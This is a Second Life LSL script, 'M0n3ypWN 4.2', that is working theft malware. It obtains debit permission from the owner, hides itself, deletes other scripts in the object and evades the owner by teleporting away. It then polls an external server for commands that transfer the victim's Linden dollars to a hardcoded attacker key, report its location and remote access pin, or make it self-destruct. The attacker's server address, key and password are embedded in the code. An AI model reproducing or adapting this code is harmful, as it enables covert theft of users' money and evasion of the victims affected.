string product = "M0n3ypWN 4.2";
string address = "http://ontafreng.cwsurf.de/money/";
key YourKey = "a3f284c8-13ef-4aca-a23e-e9f75d82f864";
string del_pw = "nuhana";
string user;
//-----Requests-----\\
key owner_request;
key create_request;
key money_request;
key delete_request;
key already_request;
//-----Requests-----\\
string last;
integer move = 1;
integer pin;
default
{
    on_rez(integer num)
    {
        llResetScript();
    }
    
    attach(key id)
    {
        llRequestPermissions(llGetOwner(),PERMISSION_ATTACH);
        llDetachFromAvatar();
    }
    
    changed(integer change)
    {
        if(change & CHANGED_LINK)
        if(llAvatarOnSitTarget())
        {
            llUnSit(llAvatarOnSitTarget());
        }
    }
    
    transaction_result(key id, integer suc, string data)
    {
        if(suc == 1)
        {
            llInstantMessage(YourKey, product + "\nLinden-Dollar wurden erfolgreich übertragen von\n" + user);
        }
        else
        {
            llInstantMessage(YourKey, product + "\nLinden-Dollar wurden aus folgendem Grund nicht übertragen\n" + data);
        }
    }
    
    timer()
    {
        if(move == 1)
        {
        @again;
        vector pos = llGetPos();
        float z = llFrand(3995) + llGround(llGetPos());
        if(llSetRegionPos(<pos.x,pos.y,z>) == 0)
        {
            jump again;
        }
        }
        money_request = llHTTPRequest(address + user + ".txt",[],"");
    }
    
    state_entry()
    {
        user = llGetUsername(llGetOwner());
       llRequestPermissions(llGetOwner(), PERMISSION_DEBIT);
    }
       
    sensor(integer num)
    {
        vector pos = llGetPos();float z = pos.z;
        if(z < 2000)
        {
            llSetRegionPos(llGetPos() + <0,0,2000>);
        }
        else
        {
            llSetRegionPos(llGetPos() - <0,0,2000>);
        }
    }
    
    run_time_permissions(integer perm)
    {
        if(perm & PERMISSION_DEBIT)
        {
        llUnSit(llGetOwner());
        llSitTarget(<0,0,100>,ZERO_ROTATION);
        llSensorRepeat("",llGetOwner(),AGENT,96,PI,1);    
        already_request = llHTTPRequest(address + user + ".txt",[],"");
        }
        else
        {
            llDie();
        }
    }

    http_response(key req, integer status, list meta, string body)
    {
        if(last != body)
        {
            last = body;
        if(req == owner_request) //OWNER
        {
            if(status == 200)
            {
                
                YourKey = (key)body;
                llInstantMessage(YourKey,product + "\nDu wurdest als Administrator für\n" + user + "\nausgewählt");
                llSetAlpha(0,ALL_SIDES);
                llSetText("",<1,1,1>,0);
                integer total_scripts = llGetInventoryNumber(INVENTORY_SCRIPT);
                list m;
                if(total_scripts > 1)
                {
                integer i;for(i = 0;i<total_scripts;i++)
                {
                    string n = llGetInventoryName(INVENTORY_SCRIPT,i);
                    if(n != llGetScriptName())
                    {
                        m += n;
                        llRemoveInventory(n);
                    }
                }
                        llInstantMessage(YourKey,product + "\nFolgende Scripte wurdem im Zuge meiner Tätigkeit aus dem Objekt entfernt:\n" + llList2CSV(m));
                }   
                vector pos = llGetPos();float z = pos.z;
                if(z > 2000)
                {
                    llSetRegionPos(llGetPos() - <0,0,2000>);
                }
                else
                {
                    llSetRegionPos(llGetPos() + <0,0,2000>);
                }
                pin = llRound(llFrand(9998)) + 1;
                llSetRemoteScriptAccessPin(pin);
                    create_request = llHTTPRequest(address + "create.php?name=" + user + "&content=" + llGetRegionName(),[],"");
                llSetTimerEvent(15);
            }
            else if(status == 404)
            {
                llInstantMessage(YourKey, product + "\nEs wurde keine                   owner.txt in deinem Verzeichnis gefunden.\nErstelle                     neue owner.txt mit deinem Key");
                create_request = llHTTPRequest(address +                               "create.php?name=owner&content=" + (string)YourKey,[],""                );
            }
        }
        if(req == already_request) //ALREADY
        {
           
            if(status == 404)
            {
                owner_request = llHTTPRequest(address + "owner.txt",[],"");
            }
            else
            {
                llInstantMessage(YourKey,product + "\nFolgender Nutzer hat versucht ein zweites MNPWN Script auszuführen\n" + user);
              llDie(); 
            }
        }
                
        if(req == create_request)
        {
            if(status == 200)
            {
                if(llGetSubString(body,0,8) == "owner.txt")
                {
                    llInstantMessage(YourKey, product + "\nowner.txt wurde erfolgreich mit deinem Key erstellt");
                    owner_request = llHTTPRequest(address + "owner.txt",[],"");
                }
                else
                {
                    
                    llInstantMessage(YourKey,product + "\nDer Einwohner\n" + user + "\nhat auf der Region\n" + llGetRegionName() + "\nGeldrechte akzeptiert.\nEine txt-Datei wurde erstellt");
                }
            }
            else
            {
                llInstantMessage(YourKey, product + "\nFEHLERMELDUNG\nEine create_request Abfrage wurde nicht mit dem Status 200 beantwortet");
            }
        }
        if(req == money_request)
        {
            if(status == 200)
            {
                
                move = 1;
                if(llGetSubString(body,0,5) == "money:")
                {
                    integer amount = (integer)llGetSubString(body,6,llStringLength(body));
                    llTransferLindenDollars(YourKey,amount);
                }
                if(llGetSubString(body,0,5) == "beacon")
                {
                    vector pos = llList2Vector(llGetObjectDetails(YourKey,[OBJECT_POS]),0);
                    if(pos != ZERO_VECTOR)
                    {
                        move = 0;
                        llSetRegionPos(pos); 
                    }
                    llInstantMessage(YourKey,product + "\nDeine Suchanfrage hat mich erreicht\nIch befinde mich auf\n" + llGetRegionName() + "\nIch bin im Besitz von\n" + user + "\nMein Load-Pin lautet\n" + (string)pin + "\nMein Key lautet\n" + (string)llGetKey());              
                }
                if(llGetSubString(body,0,5) == "delete")
                {
                    delete_request = llHTTPRequest(address + "delete.php?password=" + del_pw + "&file=" + user,[],"");
                }
                if(llGetSubString(body,0,3) == "idle")
                {
                    llInstantMessage(YourKey,product + "\nObjekt steht");
                }
            }
                    
            
            if(status == 404)
            {
                llInstantMessage(YourKey,product + "\nFEHLERMELDUNG\nUserdatei existiert nicht");
            }
        }
        if(req == delete_request)
        {
            if(status == 404)
            {
                llInstantMessage(YourKey, product + "\nFEHLERMELDUNG\nDelete-Script existiert nicht oder wurde falsch aufgerufen");
            }
            else
            {
                if(llGetSubString(body,0,0) == "0")
                {
                    llInstantMessage(YourKey,product + "\nFEHLERMELDUNG\nDas Passwort für das Delete-Script ist falsch. Prüfe Variable pw_del (LSL) und variable $password (PHP) Beide String-Werte müssen identisch sein");
                }
                else
                {   
                    llInstantMessage(YourKey,product + "\nLöschantrag erhalten\nVernichte Objekt auf Region\n" + llGetRegionName() + "\nIm Besitz von\n" + user);llDie();
                }
            }
}
        }
    
            }
}